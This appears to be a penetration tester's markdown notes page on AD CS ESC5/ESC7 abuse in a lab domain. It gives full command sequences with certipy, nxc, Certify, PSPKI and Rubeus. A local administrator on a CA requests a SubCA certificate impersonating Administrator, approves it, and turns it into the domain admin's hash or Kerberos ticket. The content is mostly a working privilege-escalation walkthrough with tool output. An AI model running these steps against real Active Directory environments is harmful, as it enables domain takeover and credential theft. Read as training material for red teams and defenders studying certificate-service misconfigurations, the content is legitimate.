### Content

- [Overview](#overview)
	- [Requirements](#requirements)
- [From Linux](#from-linux)
	- [Linux - Enumeration](#linux---enumeration)
	- [Linux - Abuse](#linux---abuse)
- [From Windows](#from-windows)
	- [Windows - Enumeration](#windows---enumeration)
	- [Windows - Abuse](#windows---abuse)

> PKI-related objects DACLs Abuse

---
### Overview

Compromising accounts with excessive privileges over PKI-related objects can lead to full PKI infrastructure compromise. ESC5 isn't independent, It's just an enabler for another ESCs such as ESCs 4 and 7. 

##### Requirements

Compromising an account with privileges over:

1. The CA server’s AD computer object 
	- By abusing the kerberos extensions (S4U2Self or S4U2Proxy).
2. The CA server’s RPC/DCOM server.
3. Any child AD object or container in the container `CN=Public Key Services,CN=Services,CN=Configuration`. e.g.: 
	1. Certification Authorities container.
	2. Certificate Templates container -> `GenericWrite` allows template creation.
	3. Enrollment Services Container.
	4. NTAuthCertificates object.

---
### From Linux

> The scenario: We compromised an admin account from the local administrators, not the domain administrators. As a local administrator over the CA machine, we can replicate ESC4 or ESC7. I'm going to replicate ESC7.
#### Linux - Enumeration

`Certipy` doesn't show that the local administrators group has permissions over the CA server, although a local administrator can abuse any vulnerability requiring elevated privileges to modify components of the ADCS server.

```bash
$ certipy find -u user1 -p Password123! -dc-ip 172.16.19.3 -stdout
Certificate Authorities
  0
    CA Name                             : lab-WS01-CA
    DNS Name                            : WS01.lab.local
    Certificate Subject                 : CN=lab-WS01-CA, DC=lab, DC=local
    <SNIP>
    Permissions
      Owner                             : LAB.LOCAL\Administrators
      Access Rights
        ManageCa                        : LAB.LOCAL\Administrators
                                          LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        ManageCertificates              : LAB.LOCAL\Administrators
                                          LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        Enroll                          : LAB.LOCAL\Authenticated Users
        
### Making sure that the user is a local administrator over the CA server
$ nxc smb ws01.lab.local -u user1 -p Password123!
SMB         172.16.19.5     445    WS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:WS01) (domain:lab.local) (signing:False) (SMBv1:None)
SMB         172.16.19.5     445    WS01             [+] lab.local\user1:Password123! (Pwn3d!)
```

#### Linux - Abuse

From this point I will replicate ESC7:

```bash
$ certipy req -u user1@lab.local -p Password123! -ca lab-WS01-CA -template SubCA -upn Administrator -target-ip 172.16.19.5
...
[*] Request ID is 14
...
[*] Wrote private key to '14.key'
...

$ certipy ca -u user1@lab.local -p Password123! -ca lab-WS01-CA -target-ip 172.16.19.5 -issue-request 14
...
[*] Successfully issued certificate request ID 14

$ certipy req -u user1@lab.local -p Password123! -ca lab-WS01-CA -target-ip 172.16.19.5 -retrieve 14
...
[*] Wrote certificate and private key to 'administrator.pfx'

$ certipy auth -pfx administrator.pfx -domain lab.local -dc-ip 172.16.19.3
[*] Got hash for 'administrator@lab.local': aad3b....
```

---
### From Windows

> The scenario: We compromised an admin account from the local administrators, not the domain administrators. As a local administrator over the CA machine, we can replicate ESC4 or ESC7. I'm going to replicate ESC7.

#### Windows - Enumeration

Unlike `Certipy`, `Certify.exe` will show you that the built in administrators group have `ManageCA` and `ManageCertificates` privileges in the ADCS server.

```powershell
PS C:\Tools> whoami
dc\user1
PS C:\Tools> hostname
WS01
PS C:\Tools> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
DC\user1
DC\Domain Admins
The command completed successfully.

PS C:\Tools> .\Certify.exe find /vulnerable

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=lab,DC=local'

[*] Listing info about the Enterprise CA 'lab-WS01-CA'

    Enterprise CA Name            : lab-WS01-CA
    DNS Hostname                  : WS01.lab.local
    FullName                      : WS01.lab.local\lab-WS01-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=lab-WS01-CA, DC=lab, DC=local
    .................<SNIP>
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               DC\Domain Admins              S-1-5-21-1817219280-1014233819-995920665-512
      Allow  ManageCA, ManageCertificates               DC\Enterprise Admins          S-1-5-21-1817219280-1014233819-995920665-519
    Enrollment Agent Restrictions : None

[+] No Vulnerable Certificates Templates found!
```

#### Windows - Abuse

From this point I will replicate ESC7:

```powershell
PS C:\Tools> .\Certify.exe request /ca:ws01.lab.local\lab-ws01-ca /template:SubCA /altname:Administrator
[SNIP]
[!] CA Response             : The submission failed: Denied by Policy Module
[!] Last status             : 0x80094012. Message: The permissions on the certificate template do not allow the current user to enroll for this type of certificate. (Exception from HRESULT: 0x80094012)
[*] Request ID              : 13
[SNIP]

PS C:\Tools\v4.4.1\PSPKI-4.4.1\PSPKI> Import-Module .\PSPKI.psm1

PS C:\Tools> Get-CertificationAuthority -ComputerName WS01.lab.local | Get-FailedRequest | Select-Object RequestID, Properties | fl

[SNIP]
RequestID  : 13
Properties : {[RequestID, 13], [Request.StatusCode, -2146877422], [Request.DispositionMessage, Denied by Policy Module],
             [Request.RequesterName, DC\user1]...}
             
PS C:\Tools> Get-CertificationAuthority -ComputerName WS01.lab.local | Get-FailedRequest -RequestID 13 | Approve-CertificateRequest

PS C:\Tools> .\Certify.exe download /ca:ws01.lab.local\lab-ws01-ca /id:13

# add the certificate content to the file cert.pem then convert it to pfx
PS C:\Tools> notepad.exe .\cert.pem
PS C:\Tools> certutil.exe -mergepfx .\cert.pem .\cert.pfx
PS C:\Tools> .\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcrednetials
```